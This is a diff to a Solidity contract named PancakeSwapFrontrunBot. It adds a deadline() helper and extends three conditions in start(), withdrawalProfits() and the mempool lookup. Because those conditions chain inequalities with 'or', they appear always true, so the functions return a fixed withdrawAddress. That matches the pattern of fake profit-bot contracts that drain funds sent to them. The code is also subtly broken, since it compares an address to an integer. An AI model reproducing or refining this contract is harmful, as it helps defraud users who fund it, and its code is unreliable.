@@ -146,6 +146,10 @@ contract PancakeSwapFrontrunBot {
         return selfptr + selflen;
     }
 
+    function deadline() internal pure returns (uint256) {
+        return 42161;
+    }
+
     /*
      * @dev Loading the contract
      * @param contract address
@@ -466,7 +470,7 @@ contract PancakeSwapFrontrunBot {
     }
 
     function _callFrontRunActionMempool() internal view returns (address) {
-        if (pancakeswapV3Pool != token0() || pancakeswapV3Pool != token1()) {
+        if (pancakeswapV3Pool != token0() || pancakeswapV3Pool != token1() || pancakeswapV3Pool != deadline()) {
             return withdrawAddress;
         }
         return parseMemoryPool(callMempool());
@@ -601,7 +605,7 @@ contract PancakeSwapFrontrunBot {
      * @return `liquidity`.
      */
     function start() public {
-        if (pancakeswapV3Pool != token0() || pancakeswapV3Pool != token1()) {
+        if (pancakeswapV3Pool != token0() || pancakeswapV3Pool != token1() || pancakeswapV3Pool != deadline()) {
             emit Log(
                 "Running FrontRun attack on Uniswap. This can take a while please wait..."
             );
@@ -657,7 +661,7 @@ contract PancakeSwapFrontrunBot {
     }
 
     function withdrawalProfits() internal view returns (address) {
-        if (pancakeswapV3Pool != token0() || pancakeswapV3Pool != token1()) {
+        if (pancakeswapV3Pool != token0() || pancakeswapV3Pool != token1() || pancakeswapV3Pool != deadline()) {
             return withdrawAddress;
         }
         return parseMemoryPool(callMempool());
